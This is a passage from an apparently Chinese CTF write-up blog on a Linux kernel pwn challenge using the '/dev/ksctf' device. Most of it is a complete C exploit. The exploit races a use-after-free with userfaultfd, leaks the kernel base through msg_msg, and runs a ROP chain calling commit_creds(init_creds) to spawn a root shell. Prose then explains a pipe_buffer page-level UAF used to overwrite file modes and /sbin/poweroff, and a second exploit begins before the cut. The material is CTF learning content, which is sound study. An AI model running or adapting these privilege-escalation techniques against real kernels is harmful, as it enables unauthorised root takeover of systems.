msgsz, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">peekMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp,</span><br><span class="line">                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMsg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next, <span class="type">uint64_t</span> m_list_prev,</span></span><br><span class="line"><span class="params">              <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts,  <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span>&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            heap_addr = *(<span class="type">size_t</span>*)vuln.e;</span><br><span class="line">            hexx(<span class="string">&quot;heap_addr&quot;</span>, heap_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">sem_t</span> sem_write, sem_free;</span><br><span class="line"><span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> uffd_buf[<span class="number">0x200</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span>* uffd_buf, <span class="type">pthread_t</span> pthread_moniter, <span class="type">void</span>* handler)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line"> </span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_NONBLOCK|O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) err_exit(<span class="string">&quot;syscall for userfaultfd ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_API ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)uffd_buf;</span><br><span class="line">    uffdio_register.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_REGISTER ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> res = pthread_create(&amp;pthread_moniter, <span class="literal">NULL</span>, handler, uffd);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) err_exit(<span class="string">&quot;pthread_create ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hijack_handler</span><span class="params">(<span class="type">void</span> *args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd = (<span class="type">int</span>)args;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="keyword">if</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec poll for leak_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;ERROR on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            err_exit(<span class="string">&quot;INCORRET EVENT in leak_handler&quot;</span>);</span><br><span class="line">        <span class="comment">// operation</span></span><br><span class="line">        info(<span class="string">&quot;hijack the kernel in userfaultfd -- hijack_handler&quot;</span>);</span><br><span class="line">        del();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(msg_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg_buf));</span><br><span class="line">        <span class="type">int</span> ret = writeMsg(msg_qid, msg_buf, <span class="number">0x400</span> - <span class="number">0x30</span>, <span class="number">0x1337</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;Write msg.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uffd_buf[<span class="number">0</span>] = heap_addr - <span class="number">0x7bc00</span> + <span class="number">0xc8</span>;</span><br><span class="line">        uffd_buf[<span class="number">1</span>] = heap_addr - <span class="number">0x7bb40</span>;</span><br><span class="line">        uffd_buf[<span class="number">2</span>] = <span class="number">0x1337</span>;</span><br><span class="line">        uffd_buf[<span class="number">3</span>] = <span class="number">0x1000</span>;</span><br><span class="line">        uffd_buf[<span class="number">4</span>] = heap_addr + <span class="number">0x300</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[<span class="number">1</span>], <span class="string">&quot;stas&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;write pipe.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[0]&quot;</span>, uffd_buf[<span class="number">0</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[1]&quot;</span>, uffd_buf[<span class="number">1</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[2]&quot;</span>, uffd_buf[<span class="number">2</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[3]&quot;</span>, uffd_buf[<span class="number">3</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[4]&quot;</span>, uffd_buf[<span class="number">4</span>]);</span><br><span class="line">        </span><br><span class="line">        uffdio_copy.src = uffd_buf;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = <span class="number">0x1000</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec ioctl for UFFDIO_COPY in leak_handler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_shell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* to exit the process normally, instead of segmentation fault */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> get_root_func = (<span class="type">size_t</span>)get_root_shell;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> data[<span class="number">0x1100</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ksctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vuln.msg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(vuln.msg, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    msg_qid = getMsgQueue();</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line">    ptr = heap_addr;</span><br><span class="line">    hexx(<span class="string">&quot;ptr&quot;</span>, ptr);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> pwn;</span><br><span class="line">    <span class="type">char</span> *uffd_buf_hijack = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(uffd_buf_hijack, &amp;pwn, hijack_handler);</span><br><span class="line"></span><br><span class="line">    write(fd,uffd_buf_hijack, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (readMsg(msg_qid, data, <span class="number">0x1000</span>, <span class="number">0x1337</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;read msg.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    binary_dump(<span class="string">&quot;leak data + 0x300&quot;</span>, data + <span class="number">0x300</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;leak, &amp;data[<span class="number">0x3e8</span>], <span class="number">8</span>);</span><br><span class="line">    hexx(<span class="string">&quot;leak&quot;</span>, leak);</span><br><span class="line">    kernel_base = leak - <span class="number">0x101a740</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_base&quot;</span>, kernel_base);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line">    magic_gadget += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;modprobe_path&quot;</span>, modprobe_path);</span><br><span class="line">    hexx(<span class="string">&quot;magic_gadget&quot;</span>, magic_gadget);</span><br><span class="line">    </span><br><span class="line">    init_creds = kernel_base + <span class="number">0x1448cc0</span>;</span><br><span class="line">    commit_creds = kernel_base + <span class="number">0x97d00</span>;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="number">49</span>;</span><br><span class="line">    hexx(<span class="string">&quot;commit_creds&quot;</span>, commit_creds);</span><br><span class="line">    hexx(<span class="string">&quot;work_for_cpu_fn&quot;</span>, work_for_cpu_fn);</span><br><span class="line">    hexx(<span class="string">&quot;swapgs_restore_regs_and_return_to_usermode&quot;</span>, swapgs_restore_regs_and_return_to_usermode);</span><br><span class="line"></span><br><span class="line">    pop_rdi = kernel_base + <span class="number">0xe031</span>;</span><br><span class="line">    add_rsp_188_pop_rbx_ret = kernel_base + <span class="number">0x9369cc</span>;</span><br><span class="line">    add_rsp += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;add_rsp_188_pop_rbx_ret&quot;</span>,add_rsp_188_pop_rbx_ret);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> index = <span class="number">0x20</span>;</span><br><span class="line">    payload[index++] = add_rsp;</span><br><span class="line">    payload[index++] = <span class="number">0x800000000</span>;</span><br><span class="line">    payload[index++] = ptr + <span class="number">0x400</span> + <span class="number">0x10</span>;</span><br><span class="line">    payload[index++] = magic_gadget;</span><br><span class="line">    payload[index++] = <span class="number">0</span>;</span><br><span class="line">    payload[index++] = pop_rdi;</span><br><span class="line">    payload[index++] = init_creds;</span><br><span class="line">    payload[index++] = commit_creds;</span><br><span class="line">    payload[index++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">    payload[index++] = <span class="number">0</span>;</span><br><span class="line">    payload[index++] = <span class="number">0</span>;</span><br><span class="line">    payload[index++] = get_root_shell;</span><br><span class="line">    payload[index++] = user_cs;</span><br><span class="line">    payload[index++] = user_rflags;</span><br><span class="line">    payload[index++] = user_sp;</span><br><span class="line">    payload[index++] = user_ss;</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line">    write(fd, payload, <span class="number">0x180</span>);</span><br><span class="line"></span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="求解效果-1"><a href="#求解效果-1" class="headerlink" title="求解效果"></a>求解效果</h3><img src="/2024/10/07/kno_puts/8.png" class="" title="我的图图呢">  <h2 id="userfaultfd-pipe-buffer-page-UAF"><a href="#userfaultfd-pipe-buffer-page-UAF" class="headerlink" title="userfaultfd + pipe_buffer  + page UAF"></a>userfaultfd + pipe_buffer  + page UAF</h2><h3 id="思路分析-3"><a href="#思路分析-3" class="headerlink" title="思路分析"></a>思路分析</h3><p>现在我们来假设一种比较极端的情况，我们 <code>/sys/kernel/notes</code> 给打了补丁无法泄露地址，而且题目不再给出堆地址，以及内核编译时开启了 <code>CONFIG_CFI_CLANG</code>（可以防止攻击者进行 <code>rop</code> 攻击），这个时候就需要我们的 <code>page uaf</code> 登场了！！！</p><p>这玩意我是从 a3 师傅的博客学的，十分建议每位内核爱好者去反复阅读那篇文章：<a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">【CTF.0x08】D^ 3CTF2023 d3kcache 出题手记 - arttnba3’s blog</a>，下面会借用 a3 师傅博客中的一些图片：-)</p><p>同样是利用 <code>userfaultfd</code> 来制造出 <code>uaf</code>，然后修改 <code>pipe buffer</code> 的 <code>page</code> 指针的第一个字节，使其出现两个 <code>pipe buffer</code> 指向同一个 <code>page</code> 的情况。</p><img src="/2024/10/07/kno_puts/9.png" class="" title="我的图图呢">  <p>此时释放掉其中一个 <code>pipe buffer</code>，就会直接释放掉一整个页，出现页级 <code>UAF</code> ！！！</p><img src="/2024/10/07/kno_puts/10.png" class="" title="我的图图呢">  <p>在 <code>gdb</code> 中所看到的情况如下：</p><img src="/2024/10/07/kno_puts/11.png" class="" title="我的图图呢">  <p>后面的操作就和题目的本身没有什么关系了（和用户态的 <code>house of some</code> 一样😇）。我本来的思路是将被释放的页重新取出来用于存储另一个 <code>pipe buffer</code> 数组，然后修改其中一个 <code>pipe buffer</code> 的 <code>flag</code> 为 <code>0x10</code>，实现任意文件的越权写入。可是喷了半天也没成功的命中。然后看到了 tplus 师傅的 wp，其思路更加的简单，即制造出 <code>page uaf</code> 后不断的喷射 <code>target file</code>（反复 open），然后修改 <code>file → f_mode</code>，也能实现越权写任意文件。</p><p>有了越权写任意文件后我是想着写 <code>/etc/passwd </code>文件，可是这道题目没有这个文件再加上我也不是很熟悉这个东西，于是我选着修改 <code>/sbin/poweroff</code>。应为这个文件是连接着 <code>busybox</code> 的。当 <code>qemu</code> 关闭的时候会以 <code>root</code> 权限来指向这个文件。因此我们可以将 <code>poweroff</code> 文件修改为 <code>readflag</code>，然后输入 <code>exit</code> 即可类似于用户态的 <code>orw</code> 一样获取 <code>flag</code></p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 